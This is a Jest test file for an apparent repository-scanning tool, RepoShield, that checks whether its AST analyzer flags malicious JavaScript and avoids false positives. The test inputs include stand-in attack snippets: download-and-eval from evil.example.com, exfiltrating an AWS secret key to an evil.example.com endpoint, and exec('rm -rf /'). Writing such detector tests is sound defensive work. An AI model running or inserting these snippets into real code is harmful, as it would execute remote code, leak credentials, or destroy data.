/**
 * RepoShield — AST Analyzer Tests
 *
 * Tests that:
 * 1. Malicious patterns are detected
 * 2. Benign patterns do NOT produce false positives
 * 3. Correlated findings have higher risk scores
 * 4. Scanning never executes code
 * 5. Output is deterministic
 */

import { analyzeFile } from '../src/analyzer';

import path from 'path';
import fs from 'fs';

const FIXTURE_DIR = path.join(__dirname, '..', 'fixtures');

// ─── Helper ───────────────────────────────────────────────────────────────────

function analyzeFixture(relativePath: string) {
  const absPath = path.join(FIXTURE_DIR, relativePath);
  const content = fs.readFileSync(absPath, 'utf-8');
  return analyzeFile(absPath, content);
}

function analyzeCode(code: string, filePath = '/test/fake.js') {
  return analyzeFile(filePath, code);
}

// ─── Malicious Pattern Tests ──────────────────────────────────────────────────

describe('AST Analyzer — Malicious Patterns', () => {
  test('detects eval() dynamic execution', () => {
    const result = analyzeCode(`eval("malicious code")`);
    expect(result.findings.length).toBeGreaterThan(0);
    expect(result.findings.some((f) => f.ruleId === 'RS-AST-001')).toBe(true);
  });

  test('detects new Function() dynamic execution', () => {
    const result = analyzeCode(`const fn = new Function("return 1"); fn();`);
    expect(result.findings.some((f) => f.ruleId === 'RS-AST-001')).toBe(true);
  });

  test('detects Buffer.from base64 decode', () => {
    const result = analyzeCode(`const x = Buffer.from('aGVsbG8=', 'base64');`);
    expect(result.findings.some((f) => f.ruleId === 'RS-AST-002')).toBe(true);
  });

  test('detects atob() base64 decode', () => {
    const result = analyzeCode(`const x = atob('aGVsbG8=');`);
    expect(result.findings.some((f) => f.ruleId === 'RS-AST-002')).toBe(true);
  });

  test('detects fetch network call', () => {
    const result = analyzeCode(`fetch('https://example.com/api')`);
    expect(result.findings.some((f) => f.ruleId === 'RS-AST-003')).toBe(true);
  });

  test('detects correlated base64 + eval as higher severity finding', () => {
    const result = analyzeCode(`
      const code = Buffer.from('dGVzdA==', 'base64').toString();
      eval(code);
    `);
    // Should produce correlated RS-AST-002 finding
    const correlatedFinding = result.findings.find(
      (f) => f.ruleId === 'RS-AST-002' && f.correlatedSignals && f.correlatedSignals.length > 1,
    );
    expect(correlatedFinding).toBeDefined();
    expect(correlatedFinding?.severity).toBe('critical');
    expect(correlatedFinding?.confidence).toBe('high');
    // Risk score should be high for correlated finding
    expect(correlatedFinding?.riskScore).toBeGreaterThanOrEqual(70);
  });

  test('detects download + execute correlated pattern (RS-AST-003)', () => {
    const result = analyzeCode(`
      const response = await fetch('http://evil.example.com/payload.js');
      const code = await response.text();
      eval(code);
    `);
    const finding = result.findings.find((f) => f.ruleId === 'RS-AST-003');
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe('critical');
  });

  test('detects process.env access combined with network (RS-AST-004)', () => {
    const result = analyzeCode(`
      const secret = process.env.AWS_SECRET_ACCESS_KEY;
      fetch('https://evil.example.com/collect', {
        method: 'POST',
        body: JSON.stringify({ secret }),
      });
    `);
    expect(result.findings.some((f) => f.ruleId === 'RS-AST-004')).toBe(true);
  });

  test('detects child_process usage (RS-AST-005)', () => {
    const result = analyzeCode(`
      const { exec } = require('child_process');
      exec('rm -rf /');
    `);
    expect(result.findings.some((f) => f.ruleId === 'RS-AST-005')).toBe(true);
  });

  test('detects dynamic property access on process (RS-AST-006)', () => {
    const result = analyzeCode(`
      const key = 'env';
      const env = process[key];
    `);
    expect(result.findings.some((f) => f.ruleId === 'RS-AST-006')).toBe(true);
  });

  test('detects vm module import (RS-AST-009)', () => {
    const result = analyzeCode(`const vm = require('vm');`);
    expect(result.findings.some((f) => f.ruleId === 'RS-AST-009')).toBe(true);
  });

  test('detects dynamic require with non-literal (RS-AST-010)', () => {
    const result = analyzeCode(`
      const moduleName = getModuleName();
      require(moduleName);
    `);
    expect(result.findings.some((f) => f.ruleId === 'RS-AST-010')).toBe(true);
  });

  test('fixture: download-exec.fixture.js is detected', () => {
    const result = analyzeFixture('malicious/download-exec.fixture.js');
    expect(result.findings.length).toBeGreaterThan(0);
    // Should find either download-exec (RS-AST-003) or individual signals
    const hasCritical = result.findings.some(
      (f) => f.severity === 'critical' || f.severity === 'high',
    );
    expect(hasCritical).toBe(true);
  });

  test('fixture: base64-exec.fixture.js is detected', () => {
    const result = analyzeFixture('malicious/base64-exec.fixture.js');
    expect(result.findings.length).toBeGreaterThan(0);
    // Should find correlated base64 + eval pattern
    expect(result.findings.some((f) => f.ruleId === 'RS-AST-002')).toBe(true);
  });

  test('fixture: secret-exfil.fixture.js is detected', () => {
    const result = analyzeFixture('malicious/secret-exfil.fixture.js');
    expect(result.findings.length).toBeGreaterThan(0);
    expect(result.findings.some((f) => f.ruleId === 'RS-AST-004')).toBe(true);
  });
});

// ─── False Positive Tests ─────────────────────────────────────────────────────

describe('AST Analyzer — False Positive Prevention', () => {
  test('single fetch() call does NOT automatically produce high-severity finding', () => {
    const result = analyzeCode(`
      // Normal API call — no exec
      async function getUserData(id) {
        const res = await fetch('/api/users/' + id);
        return res.json();
      }
    `);
    // fetch alone should only produce low/medium finding (RS-AST-003), not critical
    const criticalFindings = result.findings.filter((f) => f.severity === 'critical');
    expect(criticalFindings.length).toBe(0);
  });

  test('single eval() call does NOT automatically produce critical finding', () => {
    const result = analyzeCode(`eval("2 + 2")`);
    const criticalFindings = result.findings.filter((f) => f.severity === 'critical');
    // Not correlated — should not be critical
    expect(criticalFindings.length).toBe(0);
  });

  test('Buffer.from without exec does NOT produce critical finding', () => {
    const result = analyzeCode(`
      function decodeData(b64) {
        return Buffer.from(b64, 'base64').toString('utf-8');
      }
    `);
    const criticalFindings = result.findings.filter((f) => f.severity === 'critical');
    expect(criticalFindings.length).toBe(0);
  });

  test('legitimate dynamic import with static string does not flag RS-AST-010', () => {
    const result = analyzeCode(`
      const mod = await import('./plugins/fast.js');
    `);
    // Dynamic import with a string literal is not flagged
    expect(result.findings.some((f) => f.ruleId === 'RS-AST-010')).toBe(false);
  });

  test('fixture: legitimate-code.fixture.js produces no critical findings', () => {
    const result = analyzeFixture('benign/legitimate-code.fixture.js');
    const criticalFindings = result.findings.filter((f) => f.severity === 'critical');
    expect(criticalFindings.length).toBe(0);
  });

  test('handles malformed source gracefully (no crash)', () => {
    const result = analyzeCode('const x = {{{{{{}}}}}'); // Invalid syntax
    expect(result.parseError).toBeDefined();
    expect(result.findings.length).toBe(0);
  });
});

// ─── Determinism Tests ────────────────────────────────────────────────────────

describe('AST Analyzer — Determinism', () => {
  test('same input always produces same output', () => {
    const code = `
      const data = Buffer.from('test', 'base64');
      eval(data);
      fetch('https://example.com');
    `;
    const result1 = analyzeCode(code);
    const result2 = analyzeCode(code);

    expect(result1.findings.length).toBe(result2.findings.length);
    for (let i = 0; i < result1.findings.length; i++) {
      expect(result1.findings[i]?.ruleId).toBe(result2.findings[i]?.ruleId);
      expect(result1.findings[i]?.riskScore).toBe(result2.findings[i]?.riskScore);
    }
  });
});

// ─── Safety Tests ─────────────────────────────────────────────────────────────

describe('AST Analyzer — Safety', () => {
  test('does not modify the source content during analysis', () => {
    const originalCode = `eval("dangerous")`;
    const code = originalCode;
    analyzeCode(code);
    // Code string should be unchanged
    expect(code).toBe(originalCode);
  });

  test('handles TypeScript syntax correctly', () => {
    const result = analyzeCode(`
      interface UserData {
        name: string;
        age: number;
      }
      async function fetchUser(id: string): Promise<UserData> {
        const res = await fetch(\`/api/\${id}\`);
        return res.json() as UserData;
      }
    `, '/test/fake.ts');
    expect(result.parseError).toBeUndefined();
  });

  test('handles JSX syntax correctly', () => {
    const result = analyzeCode(`
      function Component({ name }: { name: string }) {
        return <div>{name}</div>;
      }
    `, '/test/fake.tsx');
    expect(result.parseError).toBeUndefined();
  });
});
